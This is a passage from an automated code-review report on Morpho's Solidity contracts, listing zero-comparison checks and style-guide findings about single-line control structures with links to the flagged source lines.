[177](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L177), [236](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L236), [250](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L250), [271](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L271), [289](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L289), [309](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L309), [331](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L331), [368](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L368), [370](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L370), [371](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L371), [407](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L407), [412](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L412), [428](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L428), [431](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L431), [452](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L452), [461](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L461), [470](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L470), [647](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L647), [769](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L769), [802](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L802), [809](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L809), [816](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L816), [819](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L819), [833](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L833), [840](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L840), [843](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L843), [870](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L870), [907](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L907), [918](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L918), [918](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L918)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit > 0
78:         require(length > 0, ErrorsLib.CALL_FAILED);

/// @audit == 0
94:         if (ERC20(asset).allowance(address(this), spender) == 0) {

```

[78](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L78), [94](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L94)

```solidity
File: morpho-blue-bundlers/src/ERC4626Bundler.sol

/// @audit != 0
38:         require(shares != 0, ErrorsLib.ZERO_SHARES);

/// @audit != 0
66:         require(assets != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
95:         require(assets != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
121:         require(shares != 0, ErrorsLib.ZERO_SHARES);

```

[38](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L38), [66](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L66), [95](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L95), [121](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ERC4626Bundler.sol#L121)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit > 0
109:         if (assets > 0) require(suppliedShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit > 0
159:         if (assets > 0) require(borrowedShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit > 0
193:         if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

/// @audit > 0
218:         if (assets > 0) require(withdrawnShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

```

[109](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L109), [159](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L159), [193](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L193), [218](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L218)

```solidity
File: morpho-blue-bundlers/src/Permit2Bundler.sol

/// @audit != 0
47:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[47](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/Permit2Bundler.sol#L47)

```solidity
File: morpho-blue-bundlers/src/StEthBundler.sol

/// @audit != 0
50:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
63:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
75:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[50](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L50), [63](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L63), [75](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L75)

```solidity
File: morpho-blue-bundlers/src/TransferBundler.sol

/// @audit == 0
32:         if (amount == 0) return;

/// @audit == 0
49:         if (amount == 0) return;

/// @audit != 0
63:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[32](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L32), [49](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L49), [63](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L63)

```solidity
File: morpho-blue-bundlers/src/WNativeBundler.sol

/// @audit != 0
50:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
62:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[50](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L50), [62](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L62)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

/// @audit != 0
45:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[45](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L45)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV3MigrationBundler.sol

/// @audit != 0
42:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[42](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV3MigrationBundler.sol#L42)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV2MigrationBundler.sol

/// @audit != 0
45:             require(amount != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
53:             require(amount != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
70:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[45](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L45), [53](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L53), [70](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV2MigrationBundler.sol#L70)

```solidity
File: morpho-blue-bundlers/src/migration/CompoundV3MigrationBundler.sol

/// @audit != 0
35:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

/// @audit != 0
58:         require(amount != 0, ErrorsLib.ZERO_AMOUNT);

```

[35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L35), [58](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/CompoundV3MigrationBundler.sol#L58)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit >= 0
77:         require(adjustmentSpeed >= 0, ErrorsLib.INPUT_TOO_SMALL);

/// @audit > 0
80:         require(targetUtilization > 0, ErrorsLib.ZERO_INPUT);

/// @audit > 0
120:             int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : 0);

/// @audit == 0
130:         if (startRateAtTarget == 0) {

/// @audit == 0
143:             if (linearAdaptation == 0) {

/// @audit < 0
177:         int256 coeff = err < 0 ? WAD - WAD.wDivDown(CURVE_STEEPNESS) : CURVE_STEEPNESS - WAD;

```

[77](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L77), [80](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L80), [120](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L120), [130](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L130), [143](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L143), [177](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L177)

```solidity
File: morpho-blue-oracles/src/ChainlinkOracle.sol

/// @audit == 1
70:             address(vault) != address(0) || vaultConversionSample == 1, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_NOT_ONE

/// @audit != 0
72:         require(vaultConversionSample != 0, ErrorsLib.VAULT_CONVERSION_SAMPLE_IS_ZERO);

```

[70](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L70), [72](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/ChainlinkOracle.sol#L72)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

/// @audit >= 0
24:         require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);

```

[24](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L24)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit != 0
92:         require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);

/// @audit != 0
101:         require(pendingRoot.validAt != 0, ErrorsLib.NO_PENDING_ROOT);

/// @audit == 0
145:         require(timelock == 0 || msg.sender == owner, ErrorsLib.UNAUTHORIZED_ROOT_CHANGE);

```

[92](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L92), [101](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L101), [145](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L145)




### Control structures do not follow the Solidity Style Guide

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide

*Instances *:

```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

67:         if (!hasPermission(from)) revert NoPermission(from);
68:            if (!hasPermission(to)) revert NoPermission(to);

68:         if (!hasPermission(to)) revert NoPermission(to);
69:    

```

[67-68](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L67-L68), [68-69](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L68-L69)

```solidity
File: metamorpho/src/MetaMorpho.sol

126:         if (morpho == address(0)) revert ErrorsLib.ZeroAddress();
127:     

141:         if (sender != curator && sender != owner()) revert ErrorsLib.NotCuratorRole();
142:     

158:         if (_msgSender() != owner() && _msgSender() != guardian) revert ErrorsLib.NotGuardianRole();
159:     

177:         if (validAt == 0) revert ErrorsLib.NoPendingValue();
178:             if (block.timestamp < validAt) revert ErrorsLib.TimelockNotElapsed();

178:         if (block.timestamp < validAt) revert ErrorsLib.TimelockNotElapsed();
179:     

187:         if (newCurator == curator) revert ErrorsLib.AlreadySet();
188:     

196:         if (isAllocator[newAllocator] == newIsAllocator) revert ErrorsLib.AlreadySet();
197:     

205:         if (newSkimRecipient == skimRecipient) revert ErrorsLib.AlreadySet();
206:     

216:         if (newTimelock == timelock) revert ErrorsLib.AlreadySet();
217:             _checkTimelockBounds(newTimelock);

223:             if (newTimelock == pendingTimelock.value) revert ErrorsLib.AlreadyPending();
224:     

234:         if (newFee == fee) revert ErrorsLib.AlreadySet();
235:             if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();

235:         if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
236:             if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

236:         if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();
237:     

249:         if (newFeeRecipient == feeRecipient) revert ErrorsLib.AlreadySet();
250:             if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();

250:         if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();
251:     

266:         if (newGuardian == guardian) revert ErrorsLib.AlreadySet();
267:     

288:         if (marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
289:             if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();

289:         if (MORPHO.lastUpdate(id) == 0) revert ErrorsLib.MarketNotCreated();
290:     

292:         if (newSupplyCap == supplyCap) revert ErrorsLib.AlreadySet();
293:     

298:             if (newSupplyCap == pendingCap[id].value) revert ErrorsLib.AlreadyPending();
299:     

309:         if (config[id].removableAt != 0) revert ErrorsLib.AlreadySet();
310:             if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();

310:         if (!config[id].enabled) revert ErrorsLib.MarketNotEnabled();
311:     

328:         if (length > ConstantsLib.MAX_QUEUE_LENGTH) revert ErrorsLib.MaxQueueLengthExceeded();
329:     

331:             if (config[newSupplyQueue[i]].cap == 0) revert ErrorsLib.UnauthorizedMarket(newSupplyQueue[i]);
332:             }

358:             if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
359:                 seen[prevIndex] = true;

368:                 if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);
369:     

371:                     if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);
372:     

408:                 if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
409:     

428:                 if (suppliedAssets == 0) continue;
429:     

431:                 if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);
432:     

433:                 if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);
434:     

445:         if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
446:         }

452:         if (pendingTimelock.validAt == 0) revert ErrorsLib.NoPendingValue();
453:     

461:         if (pendingGuardian.validAt == 0) revert ErrorsLib.NoPendingValue();
462:     

470:         if (pendingCap[id].validAt == 0) revert ErrorsLib.NoPendingValue();
471:     

514:         if (skimRecipient == address(0)) revert ErrorsLib.ZeroAddress();
515:     

647:             if (supplyCap == 0) continue;
648:     

743:         if (newTimelock > ConstantsLib.MAX_TIMELOCK) revert ErrorsLib.AboveMaxTimelock();
744:             if (newTimelock < ConstantsLib.MIN_TIMELOCK) revert ErrorsLib.BelowMinTimelock();

744:         if (newTimelock < ConstantsLib.MIN_TIMELOCK) revert ErrorsLib.BelowMinTimelock();
745:         }

774:                 if (
775:                         supplyQueue.length > ConstantsLib.MAX_QUEUE_LENGTH

802:             if (supplyCap == 0) continue;
803:     

816:             if (assets == 0) return;
817:             }

819:         if (assets != 0) revert ErrorsLib.AllCapsReached();
820:         }

840:             if (assets == 0) return;
841:             }

843:         if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();
844:         }

870:             if (assets == 0) break;
871:             }

907:         if (feeShares != 0) _mint(feeRecipient, feeShares);
908:     

```

[126-127](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L126-L127), [141-142](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L141-L142), [158-159](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L158-L159), [177-178](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L177-L178), [178-179](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L178-L179), [187-188](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L187-L188), [196-197](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L196-L197), [205-206](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L205-L206), [216-217](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L216-L217), [223-224](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L223-L224), [234-235](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L234-L235), [235-236](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L235-L236), [236-237](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L236-L237), [249-250](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L249-L250), [250-251](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L250-L251), [266-267](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L266-L267), [288-289](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L288-L289), [289-290](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L289-L290), [292-293](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L292-L293), [298-299](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L298-L299), [309-310](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L309-L310), [310-311](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L310-L311), [328-329](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L328-L329), [331-332](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L331-L332), [358-359](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L358-L359), [368-369](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L368-L369), [371-372](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L371-L372), [408-409](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L408-L409), [428-429](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L428-L429), [431-432](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L431-L432), [433-434](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L433-L434), [445-446](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L445-L446), [452-453](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L452-L453), [461-462](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L461-L462), [470-471](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L470-L471), [514-515](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L514-L515), [647-648](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L647-L648), [743-744](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L743-L744), [744-745](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L744-L745), [774-775](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L774-L775), [802-803](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L802-L803), [816-817](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L816-L817), [819-820](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L819-L820), [840-841](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L840-L841), [843-844](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L843-L844), [870-871](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L870-L871), [907-908](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L907-L908)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

29:         if (morpho == address(0)) revert ErrorsLib.ZeroAddress();
30:    

```

[29-30](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L29-L30)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

70:             if (!success) _revert(returnData);
71:            }

```

[70-71](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L70-L71)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

72:             if (!skipRevert) _revert(returnData);
73:            }

103:         if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));
104:     

109:         if (assets > 0) require(suppliedShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
110:             else require(suppliedAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

110:         else require(suppliedAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
111:         }

131:         if (assets == type(uint256).max) assets = ERC20(marketParams.collateralToken).balanceOf(address(this));
132:     

159:         if (assets > 0) require(borrowedShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
160:             else require(borrowedAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

160:         else require(borrowedAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
161:         }

187:         if (assets == type(uint256).max) assets = ERC20(marketParams.loanToken).balanceOf(address(this));
188:     

193:         if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
194:             else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

194:         else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
195:         }

218:         if (assets > 0) require(withdrawnShares <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
219:             else require(withdrawnAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

219:         else require(withdrawnAssets >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
220:         }

```
[72-73](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L72-L73), [103-104](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L103-L104), [109-110](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L109-L110), [110-111](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L110-L111),  [131-132](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L131-L132), [159-160](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L159-L160), [160-161](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L160-L161), [187-188](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L187-L188), [193-194](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L193-L194), [194-195](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L194-L195), [218-219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L218-L219), 